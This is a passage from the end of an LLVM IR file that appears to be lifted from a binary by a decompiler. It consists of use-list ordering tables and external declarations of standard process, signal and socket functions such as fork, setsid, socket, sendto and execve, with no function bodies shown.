1274, 1275, 22, 1283, 1281, 1282, 237, 1284, 1285, 341, 23, 1286, 188, 1287, 1288, 1289, 1290, 1291, 1292, 24, 25, 907, 908, 909, 910, 342, 26, 343, 1188, 1129, 583, 1130, 584, 1293, 1227, 1220, 1011, 1221, 1244, 189, 190, 1035, 344, 277, 1036, 1436, 191, 192, 911, 912, 194, 913, 345, 193, 914, 99, 27, 1232, 1233, 915, 916, 238, 28, 917, 918, 919, 920, 29, 1234, 1235, 1236, 128, 129, 1319, 100, 101, 102, 1320, 1321, 30, 1442, 1443, 103, 195, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 142, 935, 936, 937, 938, 939, 196, 940, 942, 943, 941, 944, 143, 945, 946, 197, 947, 198, 265, 346, 948, 949, 199, 200, 950, 951, 952, 953, 954, 955, 278, 956, 957, 347, 958, 279, 960, 205, 962, 202, 203, 959, 201, 961, 963, 965, 145, 966, 967, 206, 90, 91, 968, 969, 144, 348, 970, 971, 207, 349, 972, 973, 204, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 350, 985, 117, 96, 984, 986, 987, 988, 31, 636, 208, 637, 130, 92, 110, 964, 239, 989, 990, 991, 638, 32, 241, 209, 640, 639, 240, 280, 1438, 992, 993, 598, 1317, 1253, 1180, 1428, 994, 1228, 1250, 1260, 1431, 118, 1432, 1325, 1437, 1261, 1326, 1262, 1218, 1263, 1264, 995, 1433, 1434, 33, 1203, 146, 1204, 1205, 227, 226, 599, 119, 120, 121, 122, 616, 600, 69, 68, 147, 1206, 1207, 1208, 1209, 1211, 1210, 34, 1295, 1296, 229, 228, 601, 123, 124, 125, 126, 617, 602, 71, 70, 62, 93, 1297, 618, 1298, 1299, 1300, 127, 1301, 1302, 1303, 1304, 1305, 210, 603, 619, 604, 605, 1306, 620, 72, 148, 267, 357, 996, 358, 242, 359, 997, 356, 58, 59, 360, 998, 999, 361, 367, 368, 484, 485, 362, 1000, 1001, 1002, 363, 1003, 1004, 1005, 73, 281, 351, 353, 354, 282, 355, 1006, 211, 1007, 60, 61, 364, 1008, 365, 366, 1009, 1010, 352, 212, 283, 243, 1013, 369, 1012, 372, 373, 370, 374, 375, 371, 1014, 376, 1015, 311, 1016, 377, 1017, 378, 216, 215, 214, 213, 393, 1037, 284, 379, 285, 1038, 1039, 390, 1040, 1043, 391, 1041, 392, 1042, 247, 1044, 389, 394, 1045, 1046, 386, 1047, 1050, 387, 1048, 388, 1049, 246, 1051, 395, 1052, 383, 218, 1053, 1056, 384, 1054, 385, 219, 1055, 245, 1057, 396, 1058, 380, 217, 1059, 1062, 381, 1060, 382, 220, 1061, 244, 1063, 397, 1064, 1065, 1066, 104, 1067, 400, 398, 1068, 405, 404, 249, 1069, 402, 399, 403, 401, 248, 1070, 406, 1071, 74, 407, 408, 1072, 1073, 56, 105, 1074, 411, 409, 412, 410, 250, 1075, 413, 1076, 75, 414, 415, 1077, 1078, 57, 149, 1084, 268, 1085, 418, 1086, 76, 286, 1087, 1088, 1089, 1096, 417, 1090, 1091, 1092, 1093, 1094, 1095, 251, 1097, 419, 1098, 312, 1099, 1100, 416, 1101, 1102, 1103, 1104, 1105, 150, 151, 152, 421, 1131, 77, 287, 1132, 1133, 131, 313, 1134, 422, 1135, 420, 1136, 1137, 423, 1138, 78, 288, 1139, 424, 1140, 1141, 425, 1142, 1143, 1144, 455, 1145, 1146, 1147, 1148, 1149, 1150, 450, 1151, 451, 1152, 1153, 1154, 452, 1155, 1156, 1157, 453, 1158, 454, 1159, 1160, 1161, 1162, 1163, 1164, 459, 460, 447, 1165, 1166, 457, 458, 1167, 448, 1168, 449, 1169, 1170, 1171, 1172, 444, 1173, 1174, 445, 1175, 446, 427, 1176, 1177, 1178, 1179, 439, 1181, 1182, 440, 1183, 1184, 441, 442, 426, 1185, 1186, 443, 438, 252, 253, 1187, 429, 1189, 1190, 430, 1191, 1192, 431, 432, 433, 434, 435, 436, 437, 1193, 585, 79, 107, 428, 1194, 80, 97, 106, 456, 1195, 1196, 1197, 314, 1198, 1199, 1200, 108, 153, 154, 81, 82, 221, 222, 223, 224, 461, 289, 290, 291, 292, 468, 1212, 1214, 1215, 1216, 463, 1217, 464, 465, 466, 462, 254, 467, 1213, 315, 469, 293, 35, 471, 470, 472, 1219, 294, 295, 296, 297, 1222, 1223, 475, 473, 474, 255, 1224, 1225, 1226, 83, 481, 84, 480, 476, 1229, 479, 257, 482, 477, 1230, 478, 256, 483, 85, 98, 1231, 298, 486, 487, 488, 1238, 489, 1237, 491, 492, 490, 493, 494, 1245, 1246, 316, 1247, 1248, 155, 1249, 86, 317, 1251, 258, 495, 496, 497, 1254, 498, 1255, 1256, 269, 499, 1265, 1266, 500, 1267, 501, 1268, 1269, 502, 156, 503, 504, 505, 506, 507, 1294, 157, 87, 263, 259, 301, 302, 1307, 1308, 1309, 1310, 260, 299, 300, 303, 1311, 1312, 304, 1313, 1314, 262, 88, 158, 159, 261, 1315, 1316, 318, 160, 89, 508, 1318, 1322, 1323, 305, 307, 306, 308, 509, 512, 513, 510, 511, 225, 1324, 621, 622, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458 }
  uselistorder i32* @r4, { 28, 443, 58, 5, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 29, 30, 75, 31, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 447, 448, 451, 452, 395, 396, 397, 297, 298, 299, 300, 301, 302, 105, 106, 107, 108, 109, 110, 111, 453, 454, 112, 113, 114, 115, 116, 117, 118, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 32, 119, 120, 6, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 7, 133, 134, 135, 136, 8, 137, 138, 139, 9, 140, 141, 142, 143, 144, 145, 3, 146, 0, 147, 148, 10, 149, 150, 151, 152, 153, 154, 1, 404, 405, 418, 419, 155, 471, 472, 473, 474, 475, 476, 406, 407, 33, 477, 408, 409, 478, 11, 479, 480, 481, 482, 496, 497, 498, 499, 25, 507, 23, 491, 492, 493, 494, 495, 483, 484, 485, 156, 157, 158, 159, 160, 161, 162, 163, 486, 487, 274, 275, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 307, 308, 309, 310, 311, 372, 373, 312, 313, 314, 374, 375, 376, 490, 420, 421, 422, 423, 12, 13, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 164, 165, 166, 167, 168, 169, 361, 362, 315, 316, 317, 318, 437, 438, 387, 388, 383, 384, 272, 273, 385, 386, 276, 277, 14, 278, 500, 501, 502, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 15, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 213, 212, 214, 215, 216, 217, 218, 219, 220, 16, 221, 222, 223, 229, 230, 231, 232, 2, 233, 234, 235, 236, 237, 238, 239, 17, 240, 18, 241, 242, 243, 244, 45, 46, 47, 224, 226, 225, 227, 228, 245, 19, 20, 246, 247, 188, 189, 48, 26, 49, 50, 51, 52, 53, 54, 55, 56, 24, 57, 503, 504, 505, 506, 248, 21, 249, 22, 250, 251, 252, 253, 439, 440, 353, 354, 488, 489, 4, 254, 255, 389, 390, 402, 403, 410, 411, 445, 446, 412, 413, 449, 450, 377, 378, 414, 415, 416, 417, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 303, 304, 305, 306, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 355, 356, 357, 358, 359, 360, 363, 364, 365, 366, 367, 368, 369, 370, 371, 379, 380, 381, 382, 391, 392, 393, 394, 398, 399, 400, 401, 441, 442, 27, 444 }
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @chdir(i8*) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @wait4(i32, i32, i32, %rusage*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
